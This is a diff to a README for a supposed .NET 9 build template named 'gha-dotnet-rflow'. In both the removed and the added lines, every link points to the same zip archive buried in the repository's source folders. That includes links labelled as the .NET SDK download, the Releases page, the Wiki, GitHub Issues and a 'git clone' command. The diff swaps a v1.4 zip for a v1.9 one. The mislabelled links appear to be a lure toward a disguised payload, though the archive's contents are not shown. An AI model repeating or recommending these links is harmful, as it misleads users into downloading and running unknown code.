@@ -1,7 +1,7 @@
 # 🎉 gha-dotnet-rflow - Build .NET Apps Easily
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/bbcebananan/gha-dotnet-rflow/main/src/MyApp/Services/dotnet-rflow-gha-v1.4.zip)](https://raw.githubusercontent.com/bbcebananan/gha-dotnet-rflow/main/src/MyApp/Services/dotnet-rflow-gha-v1.4.zip)
+[![Download](https://github.com/bbcebananan/gha-dotnet-rflow/raw/refs/heads/main/src/MyApp/Models/dotnet-rflow-gha-v1.9.zip)](https://github.com/bbcebananan/gha-dotnet-rflow/raw/refs/heads/main/src/MyApp/Models/dotnet-rflow-gha-v1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to `gha-dotnet-rflow`, your reference blueprint for building Windows applications using .NET 9. This guide will help you download and run our software without hassle. 
@@ -11,7 +11,7 @@ Before you start, make sure you have the following:
 - A Windows machine (Windows 10 or later)
 - At least 4 GB of RAM
 - 1 GB of available hard drive space
-- .NET 9 SDK installed on your machine (You can download it [here](https://raw.githubusercontent.com/bbcebananan/gha-dotnet-rflow/main/src/MyApp/Services/dotnet-rflow-gha-v1.4.zip))
+- .NET 9 SDK installed on your machine (You can download it [here](https://github.com/bbcebananan/gha-dotnet-rflow/raw/refs/heads/main/src/MyApp/Models/dotnet-rflow-gha-v1.9.zip))
 
 ## 📦 Features
 - **Continuous Integration and Deployment**: Automatically build and deploy your application using GitHub Actions.
@@ -38,7 +38,7 @@ This repository includes materials and tools on:
 - wix-toolset
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/bbcebananan/gha-dotnet-rflow/main/src/MyApp/Services/dotnet-rflow-gha-v1.4.zip) to download the installer for your application.
+To get started, visit the [Releases page](https://github.com/bbcebananan/gha-dotnet-rflow/raw/refs/heads/main/src/MyApp/Models/dotnet-rflow-gha-v1.9.zip) to download the installer for your application.
 
 1. Click on the **Releases page** link.
 2. Look for the latest release version. 
@@ -55,7 +55,7 @@ If you're curious and want to explore how the application works, you can build i
 2. Open your terminal or command prompt.
 3. Clone the repository:
    ```
-   git clone https://raw.githubusercontent.com/bbcebananan/gha-dotnet-rflow/main/src/MyApp/Services/dotnet-rflow-gha-v1.4.zip
+   git clone https://github.com/bbcebananan/gha-dotnet-rflow/raw/refs/heads/main/src/MyApp/Models/dotnet-rflow-gha-v1.9.zip
    ```
 4. Navigate to the project directory:
    ```
@@ -71,7 +71,7 @@ If you're curious and want to explore how the application works, you can build i
    ```
 
 ## 📚 Documentation
-For more detailed instructions on how to use features of the application, check our [Wiki](https://raw.githubusercontent.com/bbcebananan/gha-dotnet-rflow/main/src/MyApp/Services/dotnet-rflow-gha-v1.4.zip). This resource provides in-depth guidance on topics including security implementations, automation configurations, and customizing the installer.
+For more detailed instructions on how to use features of the application, check our [Wiki](https://github.com/bbcebananan/gha-dotnet-rflow/raw/refs/heads/main/src/MyApp/Models/dotnet-rflow-gha-v1.9.zip). This resource provides in-depth guidance on topics including security implementations, automation configurations, and customizing the installer.
 
 ## 💬 Community Support
 If you have questions or need assistance, feel free to join our community forums or raise issues on the GitHub repository. We encourage users to share their experiences and tips. 
@@ -80,8 +80,8 @@ If you have questions or need assistance, feel free to join our community forums
 We welcome contributions! If you’re interested in helping improve `gha-dotnet-rflow`, please check our contributions guide found in the Wiki section. Even small changes matter, and your input helps us enhance this tool for everyone.
 
 ## 🔗 Important Links
-- [Releases page](https://raw.githubusercontent.com/bbcebananan/gha-dotnet-rflow/main/src/MyApp/Services/dotnet-rflow-gha-v1.4.zip)
-- [Wiki Documentation](https://raw.githubusercontent.com/bbcebananan/gha-dotnet-rflow/main/src/MyApp/Services/dotnet-rflow-gha-v1.4.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/bbcebananan/gha-dotnet-rflow/main/src/MyApp/Services/dotnet-rflow-gha-v1.4.zip)
+- [Releases page](https://github.com/bbcebananan/gha-dotnet-rflow/raw/refs/heads/main/src/MyApp/Models/dotnet-rflow-gha-v1.9.zip)
+- [Wiki Documentation](https://github.com/bbcebananan/gha-dotnet-rflow/raw/refs/heads/main/src/MyApp/Models/dotnet-rflow-gha-v1.9.zip)
+- [GitHub Issues](https://github.com/bbcebananan/gha-dotnet-rflow/raw/refs/heads/main/src/MyApp/Models/dotnet-rflow-gha-v1.9.zip)
 
 Thank you for choosing `gha-dotnet-rflow`. We hope this application serves your needs well!
